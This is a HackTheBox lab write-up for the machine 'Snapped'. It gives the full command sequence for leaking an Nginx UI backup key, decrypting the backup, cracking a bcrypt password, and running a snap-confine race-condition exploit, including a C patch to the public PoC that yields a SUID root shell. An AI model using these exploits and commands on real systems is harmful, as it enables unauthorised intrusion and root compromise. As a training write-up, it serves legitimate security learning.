# Snapped — HackTheBox Writeup
**Difficulty:** Hard | **OS:** Linux (Ubuntu 24.04)

---

## Overview

Snapped chains two CVEs to go from zero access to root. NFS vhost fuzz reveals an Nginx UI admin panel running v2.3.2 — vulnerable to CVE-2026-27944, which leaks the AES backup decryption key in a response header. Decrypting the backup yields a SQLite database with bcrypt hashes; cracking one gives SSH access as jonathan. From there, CVE-2026-3888 — a TOCTOU race between snap-confine and systemd-tmpfiles — is exploited to inject a malicious dynamic linker and drop a SUID root bash.

**Machine IP:** 10.129.31.143  
**User flag:** f20d0d65fcdb3c776b5f56086fe24916  
**Root flag:** f20e986a53da537219ed1b34bb23bde2

---

## Recon

```bash
nmap -A -sC -Pn -v 10.129.31.143 -o nmap.txt
```

Only 22 and 80 open. nginx on 80, title "Snapped — Infrastructure. Orchestration. Control."

```bash
echo "10.129.31.143 snapped.htb" | sudo tee -a /etc/hosts
```

---

## Vhost Fuzzing → Nginx UI

Main site is a static landing with no attack surface. Get the baseline response size, then fuzz Host headers:

```bash
curl -s http://snapped.htb | wc -c   # 20199

ffuf -u http://snapped.htb \
     -H "Host: FUZZ.snapped.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc 200,301,302,403 -fs 20199
```

Hit: `admin.snapped.htb` — an Nginx UI login panel.

```bash
echo "10.129.31.143 admin.snapped.htb" | sudo tee -a /etc/hosts
```

---

## CVE-2026-27944 — Nginx UI Unauthenticated Backup Disclosure

Nginx UI ≤ 2.3.2 exposes `/api/backup` with no authentication, and returns the AES-256-CBC encryption key and IV in the response header `X-Backup-Security`. Handing out the key alongside the ciphertext provides zero confidentiality.

```bash
curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1
# X-Backup-Security: d6mHgzdpgfg+wglFoiDrGSOGYdnvZS9YVtXpp0/2zKU=:Gzd9gy/tLDWHY2Oo2pJuuw==
```

Format: `<base64-AES-key>:<base64-IV>`. Unzip the outer archive, decrypt the inner files:

```bash
KEY=$(echo -n "d6mHgzdpgfg+wglFoiDrGSOGYdnvZS9YVtXpp0/2zKU=" | base64 -d | xxd -p -c 256)
IV=$(echo -n "Gzd9gy/tLDWHY2Oo2pJuuw==" | base64 -d | xxd -p -c 256)

openssl enc -d -aes-256-cbc -in backup_contents/nginx-ui.zip \
  -out nginx-ui-dec.zip -K $KEY -iv $IV
openssl enc -d -aes-256-cbc -in backup_contents/hash_info.txt \
  -out hash_info_dec.txt -K $KEY -iv $IV
```

`hash_info_dec.txt` confirms version 2.3.2 (patched in 2.3.3).

---

## Credential Extraction + Hash Cracking

Decrypted nginx-ui archive contains `database.db` — a SQLite backend:

```bash
sqlite3 database.db "SELECT * FROM users;"
# admin    | $2a$10$8YdBq4e...
# jonathan | $2a$10$8M7JZSRLKdtJpx9...
```

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
# jonathan: linkinpark
```

---

## User Flag

```bash
ssh jonathan@10.129.31.143   # linkinpark
cat ~/user.txt
f20d0d65fcdb3c776b5f56086fe24916
```

No sudo, no special groups. Escalation path is local.

---

## CVE-2026-3888 — snap-confine TOCTOU Race

snapd 2.63.1+24.04 with a SUID `snap-confine`. The vulnerability chains three conditions:

1. `/tmp` is world-writable — when systemd-tmpfiles deletes `/tmp/.snap`, an unprivileged user can immediately recreate it
2. snap-confine trusts that directory when setting up the snap namespace and bind-mounts libraries from it
3. Injecting a malicious `ld-linux-x86-64.so.2` into the attacker-owned `.snap` causes snap-confine to load it with root privileges, executing the payload

The PoC uses an AF_UNIX socket to slow snap-confine's execution, widening the race window.

**Cross-compile on Kali (ARM M3 → x86-64 target):**

```bash
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
apt install gcc-x86-64-linux-gnu -y

x86_64-linux-gnu-gcc -shared -fPIC -nostartfiles \
  -o librootshell.so librootshell_suid.c
x86_64-linux-gnu-gcc -O2 -o exploit exploit_suid.c -lpthread
scp exploit librootshell.so jonathan@10.129.31.143:/tmp/
```

The stock PoC failed at Phase 5 with `overwrite ld-linux: No such file or directory` — the poisoned snap-confine process died between winning the race and the `copy_file()` call. Fix: retry loop around the write:

```c
int ld_ret = -1;
for (int attempt = 0; attempt < 20; attempt++) {
    ld_ret = copy_file(g_librootshell,
              "usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2");
    if (ld_ret == 0) break;
    usleep(50000);
}
if (ld_ret < 0) { perror("[!] overwrite ld-linux"); return -1; }
```

Recompile, transfer, run:

```bash
chmod +x /tmp/exploit_patched
/tmp/exploit_patched /tmp/librootshell.so
# [+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
/var/snap/firefox/common/bash -p
```

---

## Root Flag

```bash
cat /root/root.txt
f20e986a53da537219ed1b34bb23bde2
```

---

## Things I Learned

**Encrypted backup = meaningless if you leak the key.** CVE-2026-27944 is a textbook case — returning the AES key in the same response as the ciphertext is equivalent to hiding a house key under the doormat and writing the location on the door. Always audit backup endpoints for unauthenticated access and key leakage.

**TOCTOU in /tmp is reliable.** The snap-confine race works because SUID binaries that trust world-writable paths are inherently unsafe. The combination of systemd-tmpfiles deleting the directory and unprivileged users being able to recreate it creates a predictable exploitation window without any memory corruption.

**Public PoCs need patching.** The retry loop fix came from actually reading the exploit source and understanding why the timing failed. The process died between race win and write — adding retries with backoff was the obvious fix. Reading the code and reasoning about failure modes is what separates using a PoC from understanding it.

**Cross-compilation matters.** ARM Kali vs x86-64 target with no gcc on the box. Keeping `gcc-x86-64-linux-gnu` in your toolkit saves time.

---

*Pexpo | HTB | 19 Jun 2026*
